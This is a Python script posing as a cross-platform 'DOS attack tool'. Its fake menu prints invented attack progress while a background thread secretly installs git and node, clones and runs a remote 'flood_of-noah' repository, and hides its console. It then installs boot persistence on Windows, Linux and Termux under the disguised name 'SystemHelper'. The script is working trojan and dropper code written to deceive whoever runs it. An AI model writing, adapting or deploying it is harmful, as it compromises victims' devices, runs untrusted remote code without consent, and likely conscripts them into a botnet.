#!/usr/bin/env python3
"""
UNIVERSAL BOT INSTALLER - Works on Windows, Linux, and Android/Termux
Auto-detects OS, installs dependencies, sets up persistence, runs flood_of-noah
Completely silent - no output unless in debug mode
"""

import os
import sys
import time
import platform
import subprocess
import tempfile
from pathlib import Path

# ========== DETECT PLATFORM ==========
IS_WINDOWS = os.name == 'nt'
IS_LINUX = os.name == 'posix'
IS_ANDROID = 'ANDROID_ROOT' in os.environ or 'TERMUX' in os.environ
IS_TERMUX = 'com.termux' in str(Path.home())

def debug_print(msg):
    """Print debug messages if DEBUG env is set"""
    if os.environ.get('BOT_DEBUG'):
        print(f"[DEBUG] {msg}")

# ========== SILENT INSTALLATION ==========
def install_pip_packages():
    """Install required Python packages silently"""
    packages = ['requests']
    for pkg in packages:
        try:
            __import__(pkg)
        except:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--quiet", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

install_pip_packages()
import requests

# ========== PLATFORM-SPECIFIC PATHS ==========
def get_home_dir():
    """Get home directory for current platform"""
    if IS_ANDROID:
        return Path('/data/data/com.termux/files/home')
    return Path.home()

def get_bot_dir():
    """Get bot installation directory"""
    return get_home_dir() / 'flood_of-noah'

def get_persistence_dir():
    """Get platform-specific persistence directory"""
    if IS_WINDOWS:
        return Path(os.environ.get('APPDATA', '')) / 'Microsoft/Windows/Start Menu/Programs/Startup'
    elif IS_ANDROID:
        return get_home_dir() / '.termux/boot'
    else:  # Linux
        config_dir = get_home_dir() / '.config/autostart'
        config_dir.mkdir(parents=True, exist_ok=True)
        return config_dir

# ========== PLATFORM-SPECIFIC COMMANDS ==========
def run_silent(cmd, cwd=None, shell=True):
    """Run command silently on any platform"""
    try:
        if IS_WINDOWS:
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags = subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0
            
            subprocess.Popen(
                cmd,
                cwd=cwd,
                startupinfo=startupinfo,
                creationflags=0x08000000,  # CREATE_NO_WINDOW
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                shell=shell
            )
        else:  # Linux/Android
            subprocess.Popen(
                f'nohup {cmd} > /dev/null 2>&1 &',
                cwd=cwd,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
    except:
        pass

def run_and_wait_silent(cmd, timeout=300):
    """Run command and wait for completion (silently)"""
    try:
        subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            timeout=timeout,
            env={**os.environ, 'DEBIAN_FRONTEND': 'noninteractive'}
        )
        return True
    except:
        return False

# ========== PLATFORM-SPECIFIC INSTALLERS ==========
def install_git():
    """Install git on any platform"""
    if IS_WINDOWS:
        try:
            git_url = "https://github.com/git-for-windows/git/releases/download/v2.43.0.windows.1/Git-2.43.0-64-bit.exe"
            installer = Path(tempfile.gettempdir()) / "git_installer.exe"
            
            r = requests.get(git_url, stream=True)
            with open(installer, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            subprocess.run(
                [str(installer), "/VERYSILENT", "/NORESTART", "/SUPPRESSMSGBOXES"],
                capture_output=True,
                timeout=300
            )
            installer.unlink()
        except:
            pass
    
    elif IS_ANDROID:
        run_and_wait_silent("pkg install -y git")
    
    else:  # Linux
        if os.path.exists("/usr/bin/apt-get"):
            run_and_wait_silent("sudo apt-get update -qq")
            run_and_wait_silent("sudo apt-get install -y -qq git")
        elif os.path.exists("/usr/bin/yum"):
            run_and_wait_silent("sudo yum install -y -q git")

def install_node():
    """Install node.js on any platform"""
    if IS_WINDOWS:
        try:
            node_url = "https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi"
            installer = Path(tempfile.gettempdir()) / "node_installer.msi"
            
            r = requests.get(node_url, stream=True)
            with open(installer, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            
            subprocess.run(
                ["msiexec", "/i", str(installer), "/quiet", "/norestart"],
                capture_output=True,
                timeout=300
            )
            installer.unlink()
        except:
            pass
    
    elif IS_ANDROID:
        run_and_wait_silent("pkg install -y nodejs-lts")
    
    else:  # Linux
        if os.path.exists("/usr/bin/apt-get"):
            run_and_wait_silent("curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -")
            run_and_wait_silent("sudo apt-get install -y -qq nodejs")
        elif os.path.exists("/usr/bin/yum"):
            run_and_wait_silent("curl -fsSL https://rpm.nodesource.com/setup_20.x | sudo -E bash -")
            run_and_wait_silent("sudo yum install -y -q nodejs")

# ========== PLATFORM-SPECIFIC PERSISTENCE ==========
def setup_persistence():
    """Set up auto-start on boot for current platform"""
    persistence_dir = get_persistence_dir()
    persistence_dir.mkdir(parents=True, exist_ok=True)
    
    if IS_WINDOWS:
        # Windows: Registry + Startup folder
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                key, "SystemHelper", 0, winreg.REG_SZ,
                f'"{sys.executable}" "{__file__}" --hidden'
            )
            winreg.CloseKey(key)
        except:
            pass
        
        # Also copy to Startup folder
        startup_script = persistence_dir / "SystemHelper.bat"
        with open(startup_script, 'w') as f:
            f.write(f'@echo off\n"{sys.executable}" "{__file__}" --hidden\n')
    
    elif IS_ANDROID:
        # Android/Termux: .termux/boot/ script
        boot_script = persistence_dir / "start-bot"
        with open(boot_script, 'w') as f:
            f.write(f'''#!/data/data/com.termux/files/usr/bin/bash
sleep 30
cd {get_bot_dir()}
git pull
npm install --silent --no-progress
termux-wake-lock
node index.js > /dev/null 2>&1 &
''')
        os.chmod(boot_script, 0o755)
        
        # Also create service for better reliability
        service_dir = get_home_dir() / '.termux/services/bot'
        service_dir.mkdir(parents=True, exist_ok=True)
        service_script = service_dir / 'run'
        with open(service_script, 'w') as f:
            f.write('''#!/data/data/com.termux/files/usr/bin/sh
termux-wake-lock
exec node ~/flood_of-noah/index.js
''')
        os.chmod(service_script, 0o755)
        
        # Enable service
        run_and_wait_silent("sv-enable bot")
    
    else:  # Linux
        # Linux: .config/autostart .desktop file
        desktop_file = persistence_dir / "system-helper.desktop"
        with open(desktop_file, 'w') as f:
            f.write(f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec={sys.executable} {__file__} --hidden
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
        os.chmod(desktop_file, 0o755)

# ========== CORE BOT INSTALLATION ==========
def check_git():
    """Check if git is installed"""
    try:
        subprocess.run(["git", "--version"], capture_output=True, check=True)
        return True
    except:
        return False

def check_node():
    """Check if node is installed"""
    try:
        subprocess.run(["node", "--version"], capture_output=True, check=True)
        return True
    except:
        return False

def install_bot():
    """Main installation function"""
    debug_print("Starting background installation...")
    
    # Install dependencies
    if not check_git():
        install_git()
    
    if not check_node():
        install_node()
    
    # Clone/update repo
    repo_dir = get_bot_dir()
    if not repo_dir.exists():
        run_silent(f'git clone https://github.com/benbenido025-lab/flood_of-noah "{repo_dir}"')
        time.sleep(5)
    else:
        run_silent('git pull', cwd=repo_dir)
    
    # Install npm dependencies
    run_silent('npm install --silent --no-progress', cwd=repo_dir)
    time.sleep(10)
    
    # Setup persistence
    setup_persistence()
    
    # Run bot
    run_silent('node index.js', cwd=repo_dir)

# ========== FAKE UI (Optional) ==========
def fake_ui():
    """Fake DOS interface to fool users"""
    print("""
╔══════════════════════════════════════════════════════════════╗
║                 ULTIMATE DOS ATTACK TOOL                     ║
║                   Cross-Platform Edition                     ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    import random
    import threading
    
    # Start real installation in background
    threading.Thread(target=install_bot, daemon=True).start()
    
    while True:
        target = input("\ndos> ").strip()
        if target.lower() == 'exit':
            break
        
        print(f"[+] Attacking {target}...")
        for i in range(10):
            print(f"    Packets sent: {random.randint(1000,5000)}", end='\r')
            time.sleep(0.5)
        print("\n[+] Attack completed!")

# ========== MAIN ==========
def main():
    # Check for hidden mode (no UI)
    if '--hidden' in sys.argv:
        # Hide console if possible
        if IS_WINDOWS:
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        install_bot()
        return
    
    # Check for Android/Termux special handling
    if IS_ANDROID and '--termux' not in sys.argv:
        print("""
╔══════════════════════════════════════════════════════════════╗
║                    TERMUX ANDROID MODE                       ║
║                                                               ║
║  For background installation without UI, run:                 ║
║  python3 bot.py --hidden                                      ║
║                                                               ║
║  For Termux:Boot auto-start, the script will                  ║
║  automatically install to ~/.termux/boot/                     ║
╚══════════════════════════════════════════════════════════════╝
        """)
    
    # Run fake UI
    fake_ui()

if __name__ == "__main__":
    main()
